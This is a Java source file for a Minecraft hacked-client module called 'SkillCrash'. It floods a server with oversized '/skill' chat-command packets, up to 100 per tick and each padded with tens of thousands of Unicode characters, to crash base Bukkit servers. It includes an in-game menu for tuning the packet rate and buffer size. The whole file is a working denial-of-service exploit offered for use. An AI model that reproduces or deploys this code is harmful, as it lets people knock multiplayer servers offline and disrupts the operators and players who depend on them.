package com.tricrotism.modules.crash;

import com.tricrotism.SageFang;
import com.tricrotism.api.menus.Menu;
import com.tricrotism.api.eventbus.EventHandler;
import com.tricrotism.api.modules.Module;
import com.tricrotism.events.game.GameQuitEvent;
import com.tricrotism.events.world.TickEvent;
import imgui.ImGui;
import imgui.ImGuiIO;
import imgui.flag.ImGuiWindowFlags;
import io.avaje.config.Config;
import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ClientPacketListener;
import net.minecraft.network.protocol.game.ServerboundChatCommandPacket;

public class SkillCrash extends Module implements Menu {
    public static final SkillCrash instance = new SkillCrash();

    public SkillCrash() {
        super("skillcrash", "Skill Crash", "Using the '/skill' exploit in base Bukkit installs.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!super.isActive()) return;

        Minecraft mc = Minecraft.getInstance();

        if (mc.player == null || mc.getConnection() == null) return;

        int packetsPerTick = Config.getInt(baseConfig + ".packets", 15);
        int skillCrashBuffer = Config.getInt(baseConfig + ".buffer", 32760);

        SageFang.LOGGER.info("Skill crash activated! Sending {} packets with buffer size {}",
                packetsPerTick,
                skillCrashBuffer);

        ClientPacketListener handler = mc.getConnection();
        String spam = "skill " + "\uE400".repeat(skillCrashBuffer);

        for (int i = 0; i < packetsPerTick; i++) {
            handler.send(new ServerboundChatCommandPacket(spam));
        }
    }

    @EventHandler
    private void onGameLeft(GameQuitEvent event) {
        if (isActive()) {
            toggle();
        }
    }

    @Override
    public void frame(ImGuiIO io) {
        try {
            if (!isVisible()) return;

            int flags = ImGuiWindowFlags.AlwaysAutoResize;

            ImGui.setNextWindowBgAlpha(0.45f);
            ImGui.begin(title, flags);

            if (ImGui.checkbox("Enabled##skillCrashEnabled", isActive())) {
                toggle();
            }
            ImGui.separator();

            ImGui.text("Amount");
            if (ImGui.isItemHovered()) {
                ImGui.beginTooltip();
                ImGui.pushTextWrapPos(ImGui.getFontSize() * 35f);
                ImGui.textUnformatted("Amount of packets per tick.");
                ImGui.popTextWrapPos();
                ImGui.endTooltip();
            }
            ImGui.sameLine();
            int[] amountArray = {Config.getInt(baseConfig + ".packets", 15)};
            int minPacketsPerTick = 1;
            int maxPacketsPerTick = 100;
            if (ImGui.sliderInt("##amountPerTick", amountArray, minPacketsPerTick, maxPacketsPerTick)) {
                Config.set().ofInt(baseConfig + ".packets", amountArray[0]);
            }

            ImGui.text("Buffer");
            if (ImGui.isItemHovered()) {
                ImGui.beginTooltip();
                ImGui.pushTextWrapPos(ImGui.getFontSize() * 35f);
                ImGui.textUnformatted("Spam buffer size.");
                ImGui.popTextWrapPos();
                ImGui.endTooltip();
            }
            ImGui.sameLine();
            int[] bufferArray = {Config.getInt(baseConfig + ".buffer", 32760)};
            if (ImGui.sliderInt("##spamBufferSize", bufferArray, 1, 32760)) {
                Config.set().ofInt(baseConfig + ".buffer", bufferArray[0]);
            }

            ImGui.end();
        } catch (Exception e) {
            SageFang.LOGGER.error("Error in SkillCrashMenu", e);
        }
    }
}
